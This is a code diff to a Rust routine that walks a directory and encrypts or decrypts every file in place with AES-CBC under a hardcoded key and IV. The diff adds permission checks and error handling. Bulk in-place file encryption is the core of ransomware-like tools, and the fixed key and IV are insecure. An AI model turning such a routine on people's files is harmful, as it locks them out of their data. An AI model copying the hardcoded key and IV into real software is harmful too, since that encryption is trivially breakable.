@@ -12,10 +12,17 @@ pub fn encryption(dir: &str, decrypt: bool){
             // show the file name then encrypt the file
             //println!("{}", path.unwrap().path().display());
 
-            if decrypt {
-                decrypt_file(path.unwrap().path().display().to_string().as_str());
+            let file_name = path.unwrap().path().display().to_string();
+            // check if the script have the permission to read & write the file
+            if check_file_permission(file_name.as_str()).is_err() {
+                println!("Error: Permission denied");
+                continue;
             } else {
-                encrypt_file(path.unwrap().path().display().to_string().as_str());
+                if decrypt {
+                    decrypt_file(&file_name).unwrap();           
+                } else {
+                    encrypt_file(&file_name).unwrap();
+                }
             }
 
         } else {
@@ -25,7 +32,19 @@ pub fn encryption(dir: &str, decrypt: bool){
     }
 }
 
-fn encrypt_file(file_name: &str) {
+fn check_file_permission(file_name: &str) -> Result<(), Box<dyn std::error::Error>>{
+    let metadata = fs::metadata(file_name)?;
+    let permissions = metadata.permissions();
+
+    // check if current user have the permission to read & write the file
+    if permissions.readonly() {
+        return Err("Permission denied".into());
+    }
+
+    Ok(())
+}
+
+fn encrypt_file(file_name: &str) -> Result<(), Box<dyn std::error::Error>>{
 
     let key = b"alicealicealicea";
     let iv = b"bobbobbobbobbobb";
@@ -34,11 +53,18 @@ fn encrypt_file(file_name: &str) {
     // read the file
     let encrypted_string = cipher.cbc_encrypt(iv, &fs::read(file_name).unwrap());
 
-    fs::write(file_name, encrypted_string).unwrap();
+
+    // try to write the encrypted string to the file, else skip the file
+    match fs::write(file_name, encrypted_string) {
+        Ok(_) => (),
+        Err(_) => println!("Error: Permission denied for {}", file_name)
+    }
+
+    Ok(())
 }
 
 
-fn decrypt_file(file_name: &str) {
+fn decrypt_file(file_name: &str) -> Result<(), Box<dyn std::error::Error>>{
 
     let key = b"alicealicealicea";
     let iv = b"bobbobbobbobbobb";
@@ -47,5 +73,10 @@ fn decrypt_file(file_name: &str) {
     // read the file
     let decrypted_string = cipher.cbc_decrypt(iv, &fs::read(file_name).unwrap());
 
-    fs::write(file_name, decrypted_string).unwrap();
+    match fs::write(file_name, decrypted_string) {
+        Ok(_) => (),
+        Err(_) => println!("Error: Permission denied for {}", file_name)
+    }
+
+    Ok(())
 }
